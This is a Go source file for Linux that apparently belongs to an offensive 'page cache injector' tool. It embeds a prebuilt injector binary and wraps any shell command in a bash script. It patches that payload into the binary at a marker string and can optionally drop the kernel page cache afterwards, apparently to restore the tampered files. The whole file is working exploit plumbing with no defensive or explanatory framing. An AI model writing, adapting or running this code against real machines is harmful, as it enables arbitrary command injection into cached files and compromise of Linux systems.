//go:build linux

package main

import (
	"bytes"
	_ "embed"
	"fmt"
)

//go:embed injector-amd64.bin
var injectorBin []byte

const payloadMarker = "PAGE_CACHE_INJECTOR_PAYLOAD_MARKER_V01"

// bashPayload wraps cmd in a bash shebang script.
func bashPayload(cmd string) []byte {
	return []byte("#!/bin/bash\n" + cmd + "\n")
}

func payloadCommand(cmd string, autoRestore bool) string {
	if autoRestore {
		return cmd + "\necho 3 > /proc/sys/vm/drop_caches"
	}
	return cmd
}

func patchInjector(payload []byte) ([]byte, error) {
	if len(payload) == 0 || len(payload) > 4096 {
		return nil, fmt.Errorf("payload length %d out of range", len(payload))
	}
	marker := []byte(payloadMarker)
	offset := bytes.Index(injectorBin, marker)
	if offset < 0 {
		return nil, fmt.Errorf("payload marker not found in injector binary")
	}
	lenOff := offset + len(marker)
	bufOff := lenOff + 8

	patched := bytes.Clone(injectorBin)
	for i := range 8 {
		patched[lenOff+i] = byte(uint64(len(payload)) >> (8 * i))
	}
	copy(patched[bufOff:], make([]byte, 4096))
	copy(patched[bufOff:], payload)
	return patched, nil
}
